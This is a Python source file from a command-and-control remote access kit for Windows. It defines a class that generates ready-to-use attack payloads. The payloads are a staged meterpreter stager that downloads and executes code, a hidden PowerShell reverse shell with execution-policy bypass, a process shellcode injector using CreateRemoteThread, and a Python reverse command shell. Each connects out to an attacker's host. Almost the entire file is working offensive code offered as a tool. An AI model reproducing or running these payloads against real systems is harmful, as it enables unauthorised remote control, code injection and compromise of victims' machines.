#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.2
# -------------------------------------------------------------
"""
Define a class to store payload strings.
Each function will return the proper code as a string
with the variable code such as ip/port etc passed as parameters
"""
class PayloadCode():
    #Staged python meterpreter payload code
    def staged_python_meterpreter(self,domain,lport):
        code = f"""import socket,zlib,base64,struct,time      
for i in range(10):
    try:
        host = socket.gethostbyname(('{domain}'))
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,{lport}))
        break
    except:
        time.sleep(5)
l = struct.unpack('>I', s.recv(4))[0]
d = s.recv(l)
while len(d) < l:
    d += s.recv(l - len(d))
exec(zlib.decompress(base64.b64decode(d)), {{'s': s}})"""
        return code

    #PowerShell Reverse shell code
    def reverse_powershell(self, lhost, lport):
        code = 'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = ' \
              f'New-Object Net.Sockets.TCPClient(\'{lhost}\', {lport});$NetworkStream = ' \
               '$TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);' \
               'function WriteToStream ($String) {[byte[]]$script:Buffer = ' \
               '0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + (pwd).Path + \'> \');' \
               '$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = ' \
               '$NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8)' \
               '.GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String}' \
               ' catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"'
        return code

    #Metasploit shellcode injector
    def msf_shellcode_injector(self,shellcode,process_id):
        code = f"""
import platform
from ctypes import *
PID = {process_id}
kernel32 = windll.kernel32
{shellcode}
process_handle = kernel32.OpenProcess(0x001F0FFF, False, int(PID))
memory_address = kernel32.VirtualAllocEx(process_handle, 0, len(buf), (0x00001000 | 0x00002000), 0x00000040)
kernel32.WriteProcessMemory(process_handle, memory_address, buf, len(buf), byref(c_int(0)))
if platform.machine().endswith('64'):
    kernel32.CreateRemoteThread(process_handle, None, 0, memory_address, None, 0, byref(c_int64(0)))
else:
    kernel32.CreateRemoteThread(process_handle, None, 0, memory_address, None, 0, byref(c_ulong(0)))
"""
        return code

    def command_shell(self,host,port):
        code = f"""import socket as s
import subprocess as r
import os
so=s.socket(s.AF_INET,s.SOCK_STREAM)
so.connect(('{host}',{port}))
while True:
        t = f'{{os.getcwd()}}> '.encode()
        d=so.recv(1024).decode().strip('\\n')
        if d=='exit':
                break
        try:
            if d.split(' ')[0] == 'cd':
                os.chdir(d.split(' ')[1])
        except IndexError:
            p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
            o=p.stdout.read()+p.stderr.read()
            so.sendall(o)
        else:
            p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
            o=p.stdout.read()+p.stderr.read()+t
            so.sendall(o)
"""
        return code
